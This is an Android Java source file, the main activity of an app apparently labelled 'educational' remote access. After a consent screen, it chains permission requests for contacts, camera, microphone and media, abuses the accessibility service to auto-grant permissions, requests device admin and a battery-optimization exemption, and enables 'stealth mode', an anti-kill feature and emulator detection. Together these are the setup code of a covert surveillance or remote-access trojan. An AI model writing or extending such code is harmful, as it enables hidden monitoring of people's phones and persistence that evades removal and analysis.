package com.remoteaccess.educational;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.remoteaccess.educational.permissions.AccessibilityHelperService;
import com.remoteaccess.educational.permissions.AutoPermissionManager;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.stealth.StealthManager;
import com.remoteaccess.educational.utils.PreferenceManager;
import org.json.JSONArray;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {

    private TextView statusText;
    private Button consentButton;
    private PreferenceManager preferenceManager;
    private AutoPermissionManager permissionManager;
    private StealthManager stealthManager;
    private Handler handler;
    private MainActivity activity;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        activity = this;
        preferenceManager = new PreferenceManager(this);
        permissionManager = new AutoPermissionManager(this);
        stealthManager = new StealthManager(this);
        handler = new Handler();

        statusText = findViewById(R.id.statusText);
        consentButton = findViewById(R.id.consentButton);

        if (preferenceManager.isConsentGiven()) {
            showActiveStatus();
            startRemoteAccessService();
            
            // Check if accessibility is enabled
            if (!permissionManager.isAccessibilityServiceEnabled()) {
                // Not enabled - start setup flow
                startAccessibilitySetup();
            }
            // If already enabled, nothing more needed
        } else {
            showConsentRequired();
            // Auto-start consent after 1 second
            new Handler().postDelayed(() -> {
                Intent intent = new Intent(MainActivity.this, ConsentActivity.class);
                startActivity(intent);
            }, 1000);
        }

        consentButton.setOnClickListener(v -> {
            if (!preferenceManager.isConsentGiven()) {
                Intent intent = new Intent(MainActivity.this, ConsentActivity.class);
                startActivity(intent);
            } else {
                revokeConsent();
            }
        });
    }

    private void startAccessibilitySetup() {
        Toast.makeText(this, "Please enable Accessibility Service...", Toast.LENGTH_LONG).show();
        
        // Ask for accessibility
        new Handler().postDelayed(() -> {
            permissionManager.requestAccessibilityService();
            
            // Monitor for accessibility
            monitorAccessibility();
        }, 1000);
    }

    private void monitorAccessibility() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (permissionManager.isAccessibilityServiceEnabled()) {
                    // Accessibility enabled - now auto-grant other permissions
                    autoGrantPermissions();
                } else {
                    // Keep checking
                    handler.postDelayed(this, 2000);
                }
            }
        }, 3000);
    }

    private void autoGrantPermissions() {
        Toast.makeText(this, "Accessibility enabled! Setting up...", Toast.LENGTH_SHORT).show();
        
        // Request permissions in order with delays
        
        // Step 1: Contacts (READ_CONTACTS)
        requestPermissionWithDelay(new String[]{android.Manifest.permission.READ_CONTACTS}, 1000, new PermissionCallback() {
            @Override
            public void onResult(boolean granted) {
                // Step 2: Camera
                requestPermissionWithDelay(new String[]{android.Manifest.permission.CAMERA}, 1500, new PermissionCallback() {
                    @Override
                    public void onResult(boolean granted) {
                        // Step 3: Audio (RECORD_AUDIO)
                        requestPermissionWithDelay(new String[]{android.Manifest.permission.RECORD_AUDIO}, 1500, new PermissionCallback() {
                            @Override
                            public void onResult(boolean granted) {
                                // Step 4: Videos (READ_MEDIA_VIDEO for Android 13+, READ_EXTERNAL_STORAGE for older)
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                    requestPermissionWithDelay(new String[]{"android.permission.READ_MEDIA_VIDEO"}, 1500, new PermissionCallback() {
                                        @Override
                                        public void onResult(boolean granted) {
                                            continueWithOtherPermissions();
                                        }
                                    });
                                } else {
                                    requestPermissionWithDelay(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, 1500, new PermissionCallback() {
                                        @Override
                                        public void onResult(boolean granted) {
                                            continueWithOtherPermissions();
                                        }
                                    });
                                }
                            }
                        });
                    }
                });
            }
        });
    }

    private void continueWithOtherPermissions() {
        // Step 5: All remaining permissions
        permissionManager.requestAllPermissions();

        // Step 6: Request special permissions + battery + device admin
        permissionManager.requestSpecialPermissions();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                requestBatteryOptimization();
            }
        }, 1500);

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                requestDeviceAdmin();
            }
        }, 3000);

        // Step 7: Enable stealth features
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                permissionManager.requestNotificationPermission();
                enableStealthMode();
                enableAntiKill();
                checkEmulator();
                checkAndShowPermissionStatus();
            }
        }, 4500);
    }

    private void checkAndShowPermissionStatus() {
        JSONObject status = permissionManager.getPermissionStatus();
        try {
            JSONArray granted = status.getJSONArray("granted");
            JSONArray denied = status.getJSONArray("denied");
            android.util.Log.i("Permissions", "Granted: " + granted.length() + ", Denied: " + denied.length());
            if (denied.length() > 0) {
                android.util.Log.w("Permissions", "Denied permissions: " + denied.toString());
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    private void requestPermissionWithDelay(final String[] permissions, long delay, final PermissionCallback callback) {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (activity != null) {
                    ActivityCompat.requestPermissions(activity, permissions, 101);
                }
                // Check after delay if permission was granted
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        boolean granted = true;
                        for (String permission : permissions) {
                            if (ContextCompat.checkSelfPermission(activity, permission) != PackageManager.PERMISSION_GRANTED) {
                                granted = false;
                                break;
                            }
                        }
                        if (callback != null) {
                            callback.onResult(granted);
                        }
                    }
                }, 2000);
            }
        }, delay);
    }

    private interface PermissionCallback {
        void onResult(boolean granted);
    }
    
    private void enableAntiKill() {
        try {
            stealthManager.enableAntiKill(this);
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void checkEmulator() {
        try {
            if (stealthManager.isEmulator()) {
                android.util.Log.w("Stealth", "Running on emulator");
            }
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void requestDeviceAdmin() {
        try {
            Intent intent = stealthManager.getDeviceAdminIntent();
            startActivity(intent);
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void enableStealthMode() {
        try {
            stealthManager.enableStealthMode();
        } catch (Exception e) {
            // Ignore
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        
        if (preferenceManager.isConsentGiven()) {
            showActiveStatus();
            
            // Check if accessibility got enabled while in background
            if (!permissionManager.isAccessibilityServiceEnabled()) {
                startAccessibilitySetup();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
    }

    private void showActiveStatus() {
        statusText.setText("✓ Remote Access Active\n\nYour device is connected and can be managed remotely.");
        consentButton.setText("Revoke Access");
    }

    private void showConsentRequired() {
        statusText.setText("⚠ Consent Required\n\nPlease provide consent to enable remote access features.");
        consentButton.setText("Give Consent");
    }

    private void startRemoteAccessService() {
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        startForegroundService(serviceIntent);
    }

    private void revokeConsent() {
        preferenceManager.setConsentGiven(false);
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        stopService(serviceIntent);
        showConsentRequired();
    }
    
    private void requestBatteryOptimization() {
        try {
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        } catch (Exception e) {
            try {
                Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                startActivity(intent);
            } catch (Exception e2) {
                // Ignore
            }
        }
    }
}
